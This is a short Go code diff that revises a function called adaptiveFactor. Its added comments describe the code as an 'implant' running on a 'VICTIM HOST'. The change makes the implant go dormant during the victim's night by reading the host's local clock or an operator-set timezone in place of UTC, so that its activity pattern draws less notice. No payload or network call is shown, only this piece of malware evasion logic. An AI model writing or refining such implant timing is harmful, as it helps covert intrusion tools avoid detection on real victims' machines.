@@ -152,8 +152,21 @@ func adaptiveFactor(now time.Time) (float64, float64) {
 		}
 		return 1.5, 1.6
 	}
-	loc := loadWorkingTZ()
-	h := now.In(loc).Hour()
+	// No window configured: track the VICTIM HOST's real day/night so the
+	// implant idles when its operator sleeps. Use an operator-set timezone if
+	// one was configured, otherwise the host's own local clock -- NOT a forced
+	// UTC. Forcing UTC shifted the dormant window by the host's UTC offset
+	// (e.g. a UTC+8 victim looked "active" at its 3am), inverting the heuristic.
+	var h int
+	if tz := wh.tz; tz != "" {
+		if loc, err := time.LoadLocation(tz); err == nil {
+			h = now.In(loc).Hour()
+		} else {
+			h = now.Local().Hour()
+		}
+	} else {
+		h = now.Local().Hour()
+	}
 	if h >= 9 && h < 18 {
 		return 1.0, 1.0
 	}
